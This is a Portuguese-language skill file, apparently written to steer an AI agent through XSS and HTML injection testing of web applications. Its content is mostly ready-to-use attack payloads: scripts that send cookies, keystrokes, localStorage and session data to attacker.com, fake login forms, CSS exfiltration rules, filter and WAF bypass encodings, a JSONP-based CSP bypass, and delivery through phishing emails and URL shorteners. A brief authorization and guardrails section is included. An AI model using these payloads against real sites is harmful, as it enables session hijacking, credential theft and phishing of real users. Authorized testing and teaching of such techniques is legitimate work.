---
name: Testes de Cross-Site Scripting e HTML Injection
description: Esta habilidade deve ser usada quando o usuário pede para "testar vulnerabilidades de XSS", "realizar ataques de cross-site scripting", "identificar falhas de HTML injection", "explorar vulnerabilidades de injeção do lado do cliente", "roubar cookies via XSS" ou "contornar políticas de segurança de conteúdo". Fornece técnicas abrangentes para detectar, explorar e compreender vetores de ataque XSS e HTML injection em aplicações web.
metadata:
  author: zebbern
  version: "1.1"
---

# Testes de Cross-Site Scripting e HTML Injection

## Propósito

Executar avaliações abrangentes de vulnerabilidades de injeção do lado do cliente em aplicações web para identificar falhas de XSS e HTML injection, demonstrar técnicas de exploração para roubo de sessão e captura de credenciais, e validar mecanismos de sanitização de entrada e codificação de saída. Esta habilidade viabiliza detecção e exploração sistemática em vetores de ataque armazenados, refletidos e baseados em DOM.

## Entradas / Pré-requisitos

### Acesso Necessário
- URL da aplicação web alvo com campos de entrada do usuário
- Burp Suite ou ferramentas de desenvolvedor do navegador para análise de requisições
- Acesso para criar contas de teste para testes de stored XSS
- Navegador com console JavaScript habilitado

### Requisitos Técnicos
- Compreensão da execução de JavaScript no contexto do navegador
- Conhecimento de estrutura DOM em HTML e manipulação
- Familiaridade com headers de requisição/resposta HTTP
- Compreensão de atributos de cookies e gerenciamento de sessão

### Pré-requisitos Legais
- Autorização escrita para testes de segurança
- Escopo definido incluindo domínios alvo e funcionalidades
- Acordo sobre tratamento de qualquer dado de sessão capturado
- Procedimentos de resposta a incidentes estabelecidos

## Saídas / Entregáveis

- Relatório de vulnerabilidades XSS/HTMLi com classificações de severidade
- Payloads de prova de conceito demonstrando impacto
- Demonstrações de roubo de sessão (ambiente controlado)
- Recomendações de remediação com configurações de CSP

## Fluxo de Trabalho Principal

### Fase 1: Detecção de Vulnerabilidades

#### Identificar Pontos de Reflexão de Entrada
Localize áreas onde a entrada do usuário é refletida em respostas:

```
# Vetores de injeção comuns
- Caixas de busca e parâmetros de query
- Campos de perfil do usuário (nome, bio, comentários)
- Fragmentos de URL e valores hash
- Mensagens de erro exibindo entrada do usuário
- Campos de formulário com validação apenas do lado do cliente
- Campos de formulário ocultos e parâmetros
- Headers HTTP (User-Agent, Referer)
```

#### Testes Básicos de Detecção
Insira strings de teste para observar o comportamento da aplicação:

```html
<!-- Teste de reflexão básica -->
<test123>

<!-- Teste de tag script -->
<script>alert('XSS')</script>

<!-- Teste de manipulador de evento -->
<img src=x onerror=alert('XSS')>

<!-- Teste baseado em SVG -->
<svg onload=alert('XSS')>

<!-- Teste de evento body -->
<body onload=alert('XSS')>
```

Monitore:
- Reflexão de HTML bruto sem codificação
- Codificação parcial (alguns caracteres escapados)
- Execução de JavaScript no console do navegador
- Modificações de DOM visíveis no inspetor

#### Determinar Tipo de XSS

**Indicadores de Stored XSS:**
- Entrada persiste após atualização da página
- Outros usuários veem conteúdo injetado
- Conteúdo armazenado em banco de dados/filesystem

**Indicadores de Reflected XSS:**
- Entrada aparece apenas na resposta atual
- Requer que a vítima clique em URL criada
- Nenhuma persistência entre sessões

**Indicadores de DOM-Based XSS:**
- Entrada processada por JavaScript do lado do cliente
- Resposta do servidor não contém payload
- Exploração ocorre completamente no navegador

### Fase 2: Exploração de Stored XSS

#### Identificar Locais de Armazenamento
Alvo de áreas com conteúdo de usuário persistente:

```
- Seções de comentários e fóruns
- Campos de perfil do usuário (nome de exibição, bio, localização)
- Reviews e avaliações de produtos
- Mensagens privadas e sistemas de chat
- Metadados de upload de arquivo (nome do arquivo, descrição)
- Configurações e preferências
```

#### Criar Payloads Persistentes

```html
<!-- Payload de roubo de cookies -->
<script>
document.location='http://attacker.com/steal?c='+document.cookie
</script>

<!-- Injeção de keylogger -->
<script>
document.onkeypress=function(e){
  new Image().src='http://attacker.com/log?k='+e.key;
}
</script>

<!-- Roubo de sessão -->
<script>
fetch('http://attacker.com/capture',{
  method:'POST',
  body:JSON.stringify({cookies:document.cookie,url:location.href})
})
</script>

<!-- Injeção de formulário de phishing -->
<div id="login">
<h2>Sessão Expirada - Faça Login</h2>
<form action="http://attacker.com/phish" method="POST">
Usuário: <input name="user"><br>
Senha: <input type="password" name="pass"><br>
<input type="submit" value="Login">
</form>
</div>
```

### Fase 3: Exploração de Reflected XSS

#### Construir URLs Maliciosas
Construa URLs contendo payloads de XSS:

```
# Payload refletido básico
https://target.com/search?q=<script>alert(document.domain)</script>

# Payload com URL-encoded
https://target.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E

# Manipulador de evento em parâmetro
https://target.com/page?name="><img src=x onerror=alert(1)>

# Baseado em fragmento (para DOM XSS)
https://target.com/page#<script>alert(1)</script>
```

#### Métodos de Entrega
Técnicas para entregar reflected XSS a vítimas:

```
1. Emails de phishing com links criados
2. Distribuição em redes sociais
3. Encurtadores de URL para obscurecer payload
4. Códigos QR codificando URLs maliciosas
5. Cadeias de redirecionamento através de domínios confiáveis
```

### Fase 4: Exploração de DOM-Based XSS

#### Identificar Sinks Vulneráveis
Localize funções JavaScript que processam entrada do usuário:

```javascript
// Sinks perigosos
document.write()
document.writeln()
element.innerHTML
element.outerHTML
element.insertAdjacentHTML()
eval()
setTimeout()
setInterval()
Function()
location.href
location.assign()
location.replace()
```

#### Identificar Sources
Localize onde dados controlados pelo usuário entram na aplicação:

```javascript
// Sources controláveis pelo usuário
location.hash
location.search
location.href
document.URL
document.referrer
window.name
postMessage data
localStorage/sessionStorage
```

#### Payloads de DOM XSS

```javascript
// Injeção baseada em hash
https://target.com/page#<img src=x onerror=alert(1)>

// Injeção de parâmetro de URL (processado do lado do cliente)
https://target.com/page?default=<script>alert(1)</script>

// Exploração de PostMessage
// Na página do atacante:
<iframe src="https://target.com/vulnerable"></iframe>
<script>
frames[0].postMessage('<img src=x onerror=alert(1)>','*');
</script>
```

### Fase 5: Técnicas de HTML Injection

#### HTML Injection Refletida
Modifique aparência da página sem JavaScript:

```html
<!-- Injeção de conteúdo -->
<h1>SITE INVADIDO</h1>

<!-- Roubo de formulário -->
<form action="http://attacker.com/capture">
<input name="credentials" placeholder="Digite a senha">
<button>Enviar</button>
</form>

<!-- Injeção de CSS para exfiltração de dados -->
<style>
input[value^="a"]{background:url(http://attacker.com/a)}
input[value^="b"]{background:url(http://attacker.com/b)}
</style>

<!-- Injeção de iframe -->
<iframe src="http://attacker.com/phishing" style="position:absolute;top:0;left:0;width:100%;height:100%"></iframe>
```

#### HTML Injection Armazenada
Manipulação persistente de conteúdo:

```html
<!-- Disrupção de marquee -->
<marquee>Aviso Importante de Segurança: Sua conta foi comprometida!</marquee>

<!-- Substituição de estilo -->
<style>body{background:red !important;}</style>

<!-- Conteúdo oculto com CSS -->
<div style="position:fixed;top:0;left:0;width:100%;background:white;z-index:9999;">
Formulário de login falso ou conteúdo enganoso aqui
</div>
```

### Fase 6: Técnicas de Bypass de Filtros

#### Variações de Tag e Atributo

```html
<!-- Variação de caso -->
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x ONERROR=alert(1)>

<!-- Tags alternativas -->
<svg/onload=alert(1)>
<body/onload=alert(1)>
<marquee/onstart=alert(1)>
<details/open/ontoggle=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>

<!-- Tags malformadas -->
<img src=x onerror=alert(1)//
<img """><script>alert(1)</script>">
```

#### Bypass de Codificação

```html
<!-- Codificação de entidade HTML -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- Codificação hexadecimal -->
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>

<!-- Codificação Unicode -->
<script>\u0061lert(1)</script>

<!-- Codificação mista -->
<img src=x onerror=\u0061\u006cert(1)>
```

#### Ofuscação de JavaScript

```javascript
// Concatenação de string
<script>eval('al'+'ert(1)')</script>

// Template literals
<script>alert`1`</script>

// Execução de constructor
<script>[].constructor.constructor('alert(1)')()</script>

// Codificação em Base64
<script>eval(atob('YWxlcnQoMSk='))</script>

// Sem parênteses
<script>alert`1`</script>
<script>throw/a]a]/.source+onerror=alert</script>
```

#### Bypass de Espaço em Branco e Comentário

```html
<!-- Inserção de tab/newline -->
<img src=x	onerror
=alert(1)>

<!-- Comentários de JavaScript -->
<script>/**/alert(1)/**/</script>

<!-- Comentários HTML em atributos -->
<img src=x onerror="alert(1)"<!--comment-->
```

## Referência Rápida

### Checklist de Detecção de XSS
```
1. Insira <script>alert(1)</script> → Verifique execução
2. Insira <img src=x onerror=alert(1)> → Verifique manipulador de evento
3. Insira "><script>alert(1)</script> → Teste escape de atributo
4. Insira javascript:alert(1) → Teste atributos href/src
5. Verifique tratamento de hash de URL → Potencial de DOM XSS
```

### Payloads de XSS Comuns

| Contexto | Payload |
|---------|---------|
| Corpo HTML | `<script>alert(1)</script>` |
| Atributo HTML | `"><script>alert(1)</script>` |
| String JavaScript | `';alert(1)//` |
| Template JavaScript | `${alert(1)}` |
| Atributo de URL | `javascript:alert(1)` |
| Contexto CSS | `</style><script>alert(1)</script>` |
| Contexto SVG | `<svg onload=alert(1)>` |

### Payload de Roubo de Cookie
```javascript
<script>
new Image().src='http://attacker.com/c='+btoa(document.cookie);
</script>
```

### Template de Roubo de Sessão
```javascript
<script>
fetch('https://attacker.com/log',{
  method:'POST',
  mode:'no-cors',
  body:JSON.stringify({
    cookies:document.cookie,
    localStorage:JSON.stringify(localStorage),
    url:location.href
  })
});
</script>
```

## Restrições e Guardrails

### Limites Operacionais
- Nunca injete payloads que possam danificar sistemas em produção
- Limite captura de cookies/sessão apenas para fins de demonstração
- Evite payloads que possam se propagar para usuários não intencionais (comportamento de worm)
- Não exfiltre dados reais de usuários além dos requisitos de escopo

### Limitações Técnicas
- Content Security Policy (CSP) pode bloquear scripts inline
- Cookies HttpOnly impedem acesso via JavaScript
- Atributos SameSite de cookies limitam ataques cross-origin
- Frameworks modernos frequentemente auto-escapam outputs

### Requisitos Legais e Éticos
- Autorização escrita necessária antes de testes
- Relate vulnerabilidades críticas de XSS imediatamente
- Trate credenciais capturadas conforme acordos de proteção de dados
- Não use vulnerabilidades descobertas para acesso não autorizado

## Exemplos

### Exemplo 1: Stored XSS em Seção de Comentários

**Cenário**: Recurso de comentário de blog vulnerável a stored XSS

**Detecção**:
```
POST /api/comments
Content-Type: application/json

{"body": "<script>alert('XSS')</script>", "postId": 123}
```

**Observação**: Comentário renderiza e script executa para todos os visualizadores

**Payload de Exploração**:
```html
<script>
var i = new Image();
i.src = 'https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie);
</script>
```

**Resultado**: Todo usuário visualizando o comentário tem seu cookie de sessão enviado para o servidor do atacante.

### Exemplo 2: Reflected XSS via Parâmetro de Busca

**Cenário**: Página de resultados de busca reflete query sem codificação

**URL Vulnerável**:
```
https://shop.example.com/search?q=test
```

**Teste de Detecção**:
```
https://shop.example.com/search?q=<script>alert(document.domain)</script>
```

**URL de Ataque Criada**:
```
https://shop.example.com/search?q=%3Cimg%20src=x%20onerror=%22fetch('https://attacker.com/log?c='+document.cookie)%22%3E
```

**Entrega**: URL enviada via email de phishing para usuário alvo.

### Exemplo 3: DOM-Based XSS via Fragmento de Hash

**Cenário**: JavaScript lê hash da URL e insere em DOM

**Código Vulnerável**:
```javascript
document.getElementById('welcome').innerHTML = 'Olá, ' + location.hash.slice(1);
```

**URL de Ataque**:
```
https://app.example.com/dashboard#<img src=x onerror=alert(document.cookie)>
```

**Resultado**: Script executa completamente do lado do cliente; payload nunca toca o servidor.

### Exemplo 4: Bypass de CSP via Endpoint JSONP

**Cenário**: Site possui CSP mas permite CDN confiável

**Header de CSP**:
```
Content-Security-Policy: script-src 'self' https://cdn.trusted.com
```

**Bypass**: Encontre endpoint JSONP em domínio confiável:
```html
<script src="https://cdn.trusted.com/api/jsonp?callback=alert"></script>
```

**Resultado**: CSP contornado usando fonte de script permitida.

## Solução de Problemas

| Problema | Soluções |
|----------|----------|
| Script não executa | Verifique bloqueio de CSP; verifique codificação; tente manipuladores de evento (img, svg onerror); confirme JS habilitado |
| Payload aparece mas não executa | Saia do contexto de atributo com `"` ou `'`; verifique se está dentro de comentário; teste diferentes contextos |
| Cookies não acessíveis | Verifique flag HttpOnly; tente localStorage/sessionStorage; use modo no-cors |
| CSP bloqueando payloads | Encontre JSONP em domínios whitelistados; verifique unsafe-inline; teste bypass de base-uri |
| WAF bloqueando requisições | Use variações de codificação; fragmente payload; null bytes; variações de caso |